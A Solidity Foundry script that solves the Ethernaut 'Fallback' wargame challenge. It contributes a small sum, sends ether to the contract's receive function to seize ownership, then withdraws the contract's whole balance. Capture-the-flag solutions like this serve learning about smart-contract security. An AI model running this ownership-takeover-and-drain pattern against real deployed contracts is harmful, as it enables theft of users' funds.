// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";

interface IFallbackContract {
    function contributions(address) external returns(uint256);
    function owner() external returns(address);
    function contribute() external payable;
    function getContribution() external view returns (uint256);
    function withdraw() external;
}

/// @author agadzhalov
/// @title Solution to Fallback Ethernaut challange
contract FallbackScript is Script {

    address constant FALLBACK_ADDRESS = address(0xcd71D3eB43de6D6F914807f2198e91686bE7981b);
    IFallbackContract public fallbackContract = IFallbackContract(payable(FALLBACK_ADDRESS));
    
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        // 1. Display the current owner
        console.log("1. Current owner is", fallbackContract.owner());

        // 2. Contribute to pass the validation check in receive method (contributions[msg.sender] > 0)
        fallbackContract.contribute{value: 1e1}();

        // 3. Take ownership of the contract by sending very small amount of ether
        (bool success, ) = payable(FALLBACK_ADDRESS).call{value: 0.1 ether}("");
        require(success, "Failed to send Ether for ownership transfer");

        // 4. After we are already the owner we can withraw all the ethers
        console.log("2. New owner is", fallbackContract.owner());
        fallbackContract.withdraw();

        // 5. Log the final wallet and contract balances
        console.log("3. Wallet's balance:", vm.envAddress("WALLET_ADDRESS").balance);
        console.log("4. Contract's balance:", address(fallbackContract).balance);
        
        vm.stopBroadcast();
    }
}
